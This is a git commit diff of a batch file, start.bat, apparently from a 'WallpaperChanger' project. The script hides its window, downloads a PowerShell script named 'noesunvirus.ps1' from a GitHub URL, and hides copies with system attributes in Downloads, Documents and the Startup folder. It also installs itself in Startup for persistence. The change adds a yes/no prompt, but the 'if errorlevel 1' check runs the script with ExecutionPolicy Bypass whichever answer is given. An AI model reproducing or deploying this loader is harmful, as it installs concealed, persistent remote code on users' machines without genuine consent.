935f2836820fb22c7f7bcf591f22a0197064f83c
notthecoolguyyouknow <9omxzzh1@duck.com>
2024-09-26 21:34:50 -0300

    Update start.bat

--- start.bat
+++ start.bat
@@ -1,12 +1,11 @@
 @echo off
+setlocal enabledelayedexpansion
 powershell -WindowStyle Hidden -Command ""
 
 set scriptURL=https://raw.githubusercontent.com/notthecoolguyyouknow/WallpaperChanger/main/noesunvirus.ps1
-
 set scriptPath1=%userprofile%\Downloads\noesunvirus.ps1
 set scriptPath2=%userprofile%\Documents\noesunvirus.ps1
 set scriptPath3=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\noesunvirus.ps1
-
 set batchPath=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat
 
 if not exist "%batchPath%" (
@@ -17,7 +16,11 @@ if not exist "%batchPath%" (
 :checkloop
 
 if not exist "%scriptPath1%" (
-    powershell -Command "Invoke-WebRequest -Uri '%scriptURL%' -OutFile '%scriptPath1%'"
+    powershell -Command "Invoke-WebRequest -Uri '%scriptURL%' -OutFile '%scriptPath1%' 2>&1" || (
+        echo Failed to download script
+        pause
+        exit /b 1
+    )
     attrib +h +s "%scriptPath1%"
 )
 
@@ -32,6 +35,9 @@ if not exist "%scriptPath3%" (
 )
 
 timeout /t 10 >nul
+
+choice /m "Do you want to execute the PowerShell script now?" /c YN
+if errorlevel 1 powershell -ExecutionPolicy Bypass -File "%scriptPath1%"
 
 goto checkloop
 
